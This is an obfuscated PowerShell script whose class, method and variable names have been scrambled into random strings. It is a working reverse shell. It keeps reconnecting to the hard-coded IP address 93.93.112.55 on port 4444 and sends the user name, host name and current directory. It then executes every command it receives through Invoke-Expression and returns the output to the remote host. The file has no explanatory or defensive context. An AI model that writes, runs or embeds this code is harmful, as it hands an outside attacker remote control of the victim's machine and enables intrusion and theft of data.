class UiAMrkNPGgONuBkMvzI {
    
    [string]$iHJdXssHXrBmGmWfuZVhRH = "93.93.112.55"
    [int]$FoylXtonfNdKkRQhGWNBTuO = 4444

    $iYtlOOopXZTx
    $cwXaBCpPHhLXbLFuEB
    $XzIQusqNNOT
    $oezRaikBWRcJyiLZixTsqkj
    $diPQH
    $EbGwU
    [int]$hQKKXBqmkBLFCMO = 50*1024

    EKcrSWvvGdMal() {
        $this.cwXaBCpPHhLXbLFuEB = $false
        while ($true) {
            try {
                $this.cwXaBCpPHhLXbLFuEB = New-Object Net.Sockets.TcpClient($this.iHJdXssHXrBmGmWfuZVhRH, $this.FoylXtonfNdKkRQhGWNBTuO)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.wAPVNZ()
    }

    wAPVNZ() {
        $this.iYtlOOopXZTx = $this.cwXaBCpPHhLXbLFuEB.GetStream()
        $this.oezRaikBWRcJyiLZixTsqkj = New-Object Byte[] $this.hQKKXBqmkBLFCMO
        $this.EbGwU = New-Object Text.UTF8Encoding
        $this.XzIQusqNNOT = New-Object IO.StreamWriter($this.iYtlOOopXZTx, [Text.Encoding]::UTF8, $this.hQKKXBqmkBLFCMO)
        $this.diPQH = New-Object System.IO.StreamReader($this.iYtlOOopXZTx)
        $this.XzIQusqNNOT.AutoFlush = $true
    }

    lQaSbTXbNzJNbisjPC() {
        $this.EKcrSWvvGdMal()
        $this.xCMThHWGFgkI()
    }

    wwljU($YagHlZuGHiGXetUy) {
        try {
            [byte[]]$SaeWLHgDXzmUsjynfn = [text.Encoding]::Ascii.GetBytes($YagHlZuGHiGXetUy)
            $this.XzIQusqNNOT.Write($SaeWLHgDXzmUsjynfn, 0, $SaeWLHgDXzmUsjynfn.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.lQaSbTXbNzJNbisjPC()
        }
    }

    [string] SMhJGjlgaLums() {
        try {
            $qCtgkXRatQYRIKnywj = $this.iYtlOOopXZTx.Read($this.oezRaikBWRcJyiLZixTsqkj, 0, $this.hQKKXBqmkBLFCMO)    
            $OWflM = ($this.EbGwU.GetString($this.oezRaikBWRcJyiLZixTsqkj, 0, $qCtgkXRatQYRIKnywj))
            return $OWflM
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.lQaSbTXbNzJNbisjPC()
            return ""
        }
    }

    [string] JHIOEKhOwwYuaJsAN($GgBWsYuMtPj) {
        Write-Host $GgBWsYuMtPj
        try { 
            $cOTOyPOcTlIekvVHStuFgp = Invoke-Expression $GgBWsYuMtPj | Out-String
        }
        catch {
            $DyDEyUZffNwavTtYiEjNz = $_.Exception
            $ITSRSGPnbLHgPbWEGZltljTW = $_.Message
            $cOTOyPOcTlIekvVHStuFgp = "`n$_`n"
        }
        return $cOTOyPOcTlIekvVHStuFgp
    }

    [string] DFsmFnho() {
        $BkyPmSIEXya = [Environment]::UserName
        $gjpdo = [System.Net.Dns]::GetHostName()
        $KqAcYxMMsSzxraqrlyw = Get-Location
        return "$BkyPmSIEXya@$gjpdo [$KqAcYxMMsSzxraqrlyw]~$ "
    }

    xCMThHWGFgkI() {
        while ($this.cwXaBCpPHhLXbLFuEB.Connected) {
            $this.wwljU($this.DFsmFnho())         
            $OWflM = $this.SMhJGjlgaLums()
            $cOTOyPOcTlIekvVHStuFgp = "`n"
            if ([string]::IsNullOrEmpty($OWflM)) {
                continue
            }
            $cOTOyPOcTlIekvVHStuFgp = $this.JHIOEKhOwwYuaJsAN($OWflM)
            $this.wwljU($cOTOyPOcTlIekvVHStuFgp + "`n")
            $this.iYtlOOopXZTx.Flush()
        }
        $this.cwXaBCpPHhLXbLFuEB.Close()
        $this.lQaSbTXbNzJNbisjPC()
    } 
}

$fAdZonQKxUo = [UiAMrkNPGgONuBkMvzI]::new()
$fAdZonQKxUo.lQaSbTXbNzJNbisjPC()
